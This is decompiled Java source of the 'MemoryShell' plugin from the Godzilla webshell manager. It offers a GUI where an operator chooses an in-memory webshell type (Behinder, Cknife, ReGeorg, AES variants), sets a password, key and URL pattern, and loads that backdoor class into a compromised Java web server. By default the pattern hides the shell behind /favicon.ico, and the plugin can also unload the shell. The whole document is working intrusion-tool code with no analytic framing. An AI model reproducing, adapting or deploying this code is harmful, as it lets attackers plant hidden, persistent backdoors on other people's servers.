/*     */ package shells.plugins.java;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.GBC;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.GridBagLayout;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.InputStream;
/*     */ import java.lang.reflect.Method;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JComboBox;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JTextField;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "MemoryShell", DisplayName = "内存Shell")
/*     */ public class MemoryShell
/*     */   implements Plugin
/*     */ {
/*  29 */   private static final String[] MEMORYSHELS = new String[] { "AES_BASE64", "AES_RAW", "Behinder", "Cknife", "ReGeorg" };
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   private ShellEntity shellEntity;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   private Payload payload;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*  47 */   private final JPanel panel = new JPanel(new GridBagLayout()); private final JLabel urlLabel; private final JLabel passwordLabel; private final JLabel payloadLabel; private final JLabel secretKeyLabel; private final JTextField urlTextField;
/*     */   
/*     */   public MemoryShell() {
/*  50 */     GBC gbcLUrl = (new GBC(0, 0)).setInsets(5, -40, 0, 0);
/*  51 */     GBC gbcUrl = (new GBC(1, 0, 3, 1)).setInsets(5, 20, 0, 0);
/*  52 */     GBC gbcLPassword = (new GBC(0, 1)).setInsets(5, -40, 0, 0);
/*  53 */     GBC gbcPassword = (new GBC(1, 1, 3, 1)).setInsets(5, 20, 0, 0);
/*  54 */     GBC gbcLSecretKey = (new GBC(0, 2)).setInsets(5, -40, 0, 0);
/*  55 */     GBC gbcSecretKey = (new GBC(1, 2, 3, 1)).setInsets(5, 20, 0, 0);
/*  56 */     GBC gbcLPayload = (new GBC(0, 3)).setInsets(5, -40, 0, 0);
/*  57 */     GBC gbcPayload = (new GBC(1, 3, 3, 1)).setInsets(5, 20, 0, 0);
/*  58 */     GBC gbcGenerate = (new GBC(2, 4)).setInsets(5, -40, 0, 0);
/*  59 */     GBC gbcunLoadMemoryShell = (new GBC(1, 4, 3, 1)).setInsets(5, 20, 0, 0);
/*     */     
/*  61 */     this.urlLabel = new JLabel("URL_PATTERN");
/*  62 */     this.passwordLabel = new JLabel("PASSWORD");
/*  63 */     this.secretKeyLabel = new JLabel("SECRETKEY");
/*  64 */     this.payloadLabel = new JLabel("PAYLOAD");
/*  65 */     this.urlTextField = new JTextField(16);
/*  66 */     this.passwordTextField = new JTextField(16);
/*  67 */     this.secretKeyTextField = new JTextField(16);
/*  68 */     this.payloadComboBox = new JComboBox<>(MEMORYSHELS);
/*  69 */     this.runButton = new JButton("run");
/*  70 */     this.unLoadMemoryShellButton = new JButton("unLoadMemoryShell");
/*     */     
/*  72 */     this.panel.add(this.urlLabel, gbcLUrl);
/*  73 */     this.panel.add(this.urlTextField, gbcUrl);
/*  74 */     this.panel.add(this.passwordLabel, gbcLPassword);
/*  75 */     this.panel.add(this.passwordTextField, gbcPassword);
/*  76 */     this.panel.add(this.secretKeyLabel, gbcLSecretKey);
/*  77 */     this.panel.add(this.secretKeyTextField, gbcSecretKey);
/*  78 */     this.panel.add(this.payloadLabel, gbcLPayload);
/*  79 */     this.panel.add(this.payloadComboBox, gbcPayload);
/*  80 */     this.panel.add(this.runButton, gbcGenerate);
/*  81 */     this.panel.add(this.unLoadMemoryShellButton, gbcunLoadMemoryShell);
/*     */     
/*  83 */     this.urlTextField.setText("/favicon.ico");
/*  84 */     this.passwordTextField.setText("password");
/*  85 */     this.secretKeyTextField.setText("key");
/*     */   }
/*     */   private final JTextField passwordTextField; private final JComboBox<String> payloadComboBox; private final JTextField secretKeyTextField; private final JButton runButton; private final JButton unLoadMemoryShellButton; private Encoding encoding;
/*     */   
/*     */   private void runButtonClick(ActionEvent actionEvent) {
/*     */     try {
/*  91 */       String secretKey = functions.md5(this.secretKeyTextField.getText()).substring(0, 16);
/*  92 */       String pattern = this.urlTextField.getText();
/*  93 */       String password = this.passwordTextField.getText();
/*  94 */       if (secretKey.length() > 0 && pattern.length() > 0 && password.length() > 0) {
/*  95 */         String shellName = (String)this.payloadComboBox.getSelectedItem();
/*  96 */         ReqParameter reqParameter = new ReqParameter();
/*  97 */         reqParameter.add("pwd", password);
/*  98 */         reqParameter.add("secretKey", secretKey);
/*  99 */         reqParameter.add("path", pattern);
/* 100 */         String className = String.format("x.%s", new Object[] { shellName });
/* 101 */         InputStream inputStream = getClass().getResourceAsStream(String.format("assets/%s.classs", new Object[] { shellName }));
/* 102 */         byte[] classByteArray = functions.readInputStream(inputStream);
/* 103 */         inputStream.close();
/* 104 */         boolean loaderState = this.payload.include(className, classByteArray);
/* 105 */         if (loaderState) {
/* 106 */           byte[] result = this.payload.evalFunc(className, "run", reqParameter);
/* 107 */           String resultString = this.encoding.Decoding(result);
/* 108 */           Log.log(resultString, new Object[0]);
/* 109 */           GOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
/*     */         } else {
/* 111 */           GOptionPane.showMessageDialog(this.panel, "loader fail!", "提示", 2);
/*     */         } 
/*     */       } else {
/* 114 */         GOptionPane.showMessageDialog(this.panel, "password or secretKey or urlPattern is Null", "提示", 2);
/*     */       } 
/* 116 */     } catch (Exception e) {
/* 117 */       Log.error(e);
/* 118 */       GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*     */     } 
/*     */   }
/*     */   
/*     */   private void unLoadMemoryShellButtonClick(ActionEvent actionEvent) {
/* 123 */     String urlPattern = GOptionPane.showInputDialog("urlPattern");
/* 124 */     if (urlPattern != null && urlPattern.length() > 0) {
/* 125 */       Plugin servletManagePlugin = this.shellEntity.getFrame().getPlugin("ServletManage");
/* 126 */       if (servletManagePlugin != null) {
/*     */         try {
/* 128 */           Method unLoadServletMethod = servletManagePlugin.getClass().getDeclaredMethod("unLoadServlet", new Class[] { String.class, String.class });
/* 129 */           unLoadServletMethod.setAccessible(true);
/* 130 */           String resultString = (String)unLoadServletMethod.invoke(servletManagePlugin, new Object[] { urlPattern, urlPattern });
/* 131 */           Log.log(resultString, new Object[0]);
/* 132 */           GOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
/* 133 */         } catch (Exception e) {
/* 134 */           Log.error(e);
/* 135 */           GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*     */         } 
/*     */       } else {
/* 138 */         GOptionPane.showMessageDialog(this.panel, "not find Plugin ServletManage", "提示", 2);
/*     */       } 
/*     */     } else {
/* 141 */       GOptionPane.showMessageDialog(this.panel, "not input urlPattern", "提示", 2);
/*     */     } 
/*     */   }
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 146 */     this.shellEntity = shellEntity;
/* 147 */     this.payload = this.shellEntity.getPayloadModule();
/* 148 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 149 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 156 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\java\MemoryShell.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */